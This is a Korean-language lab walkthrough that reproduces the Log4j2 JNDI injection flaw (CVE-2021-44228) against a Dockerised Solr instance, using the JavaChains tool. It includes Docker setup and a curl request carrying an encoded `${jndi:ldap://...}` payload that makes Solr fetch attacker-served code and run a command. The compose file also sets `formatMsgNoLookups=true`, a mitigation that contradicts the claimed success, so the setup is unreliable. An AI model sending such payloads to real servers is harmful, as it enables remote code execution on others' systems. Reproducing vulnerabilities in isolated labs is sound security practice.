# Apache Log4j2 JNDI 인젝션 취약점 (CVE-2021-44228)

Apache Log4j 2는 Log4j 1.x의 상위 버전으로, Logback에서 사용 가능한 많은 개선 사항을 제공하면서 Logback의 구조적 문제를 해결했습니다.

2021년 12월, Apache Log4j2에서 0-day 취약점이 발견되었습니다. Log4j의 JNDI 지원이 이름 해석을 제한하지 않았기 때문에 `rmi:` 및 `ldap:` 같은 프로토콜이 안전하지 않거나 원격 코드 실행을 허용할 수 있습니다.

## 취약점 환경 구성

### 1. JavaChains 설치
PoC를 수행하기 위해 JavaChains를 설치합니다. JavaChains는 JNDI 페이로드를 생성하고 LDAP 서버를 실행하는데 사용됩니다. 수동으로 설치하는 대신, docker-compose.yml 파일에 서비스를 추가하여 자동화된 설치를 구성했습니다.

```bash
# JavaChains 디렉토리 생성
mkdir -p CVE-2021-44228/java-chains

# Dockerfile 생성
cat > CVE-2021-44228/java-chains/Dockerfile << 'EOF'
FROM openjdk:8-jdk
WORKDIR /app
COPY target/java-chains-1.0-SNAPSHOT.jar app.jar
EXPOSE 8011
ENTRYPOINT ["java", "-jar", "app.jar"]
EOF
```

### 2. docker-compose.yml 수정
기존 docker-compose.yml 파일에 JavaChains 서비스를 추가합니다:

```yaml
version: '3'
services:
  solr:
    image: vulhub/solr:8.11.1
    ports:
      - "8983:8983"
    environment:
      - SOLR_OPTS=-Dlog4j2.formatMsgNoLookups=true
    volumes:
      - ./solr:/var/solr
    command:
      - solr-precreate
      - test
    restart: always

  java-chains:
    build: ./java-chains
    ports:
      - "8011:8011"
    restart: always
```

### 3. 환경 실행
다음 명령어로 환경을 실행합니다:

```bash
docker-compose up -d
```
JavaChains 와 vulhub/solr:8.11.1 도커 ps 확인
docker ps
![image](https://github.com/user-attachments/assets/a54ee6a0-a5da-4607-a6cf-1587055f4523)

JavaChains를 접속해보면 패스워드를 모릅니다.
![image](https://github.com/user-attachments/assets/ee97587a-7812-4fe8-ab0a-956ddfc4426d)


패스워드를 찾기 위해 
### 4. JavaChains 비밀번호 확인
JavaChains 웹 인터페이스에 접속하기 위한 비밀번호는 다음 명령어로 확인할 수 있습니다:

```bash
docker logs java-chains | grep password
```
![자바체인 로그](https://github.com/user-attachments/assets/65a2a400-e53a-430e-9e53-6a213d18841d)

## 취약점 공격

1. JavaChains 웹 인터페이스 접속:
   - 브라우저에서 http://localhost:8011 접속
   - 위에서 확인한 비밀번호 입력
   - 명령어 입력 (예: `touch /tmp/success`)
   - ![image](https://github.com/user-attachments/assets/24105608-4158-453b-bd9f-d1d2bd4b20e0)

   - "Generate" 버튼 클릭하여 LDAP URL 생성
   - ![java-chains 접속6](https://github.com/user-attachments/assets/d2c5bb0b-e348-4059-8a29-b8bd74f30468)


2. 생성된 LDAP URL을 사용하여 Solr에 페이로드 전송:
```bash
curl "http://localhost:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A50389%2F[생성된_ID]%7D"
```
![image](https://github.com/user-attachments/assets/7623333a-9a13-4fc6-8932-8fbc68eb4971)

3. 명령어 실행 확인:
```bash
docker exec -it cve-2021-44228-solr-1 bash
ls -l /tmp/success
```
![image](https://github.com/user-attachments/assets/eacafb91-137f-4404-8ee3-c220cf4ca368)

## 주의사항

1. Java Chains와 Solr 컨테이너가 같은 Docker 네트워크에 있어야 합니다.
2. JDK 버전이 8u191 미만인 경우에만 `rmi://` 또는 `ldap://` 프로토콜을 사용할 수 있습니다.
3. 취약점 공격 시 반드시 테스트 환경에서만 실행해야 합니다.

## 참고 자료

- https://logging.apache.org/log4j/2.x/security.html
- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://xz.aliyun.com/t/10649 
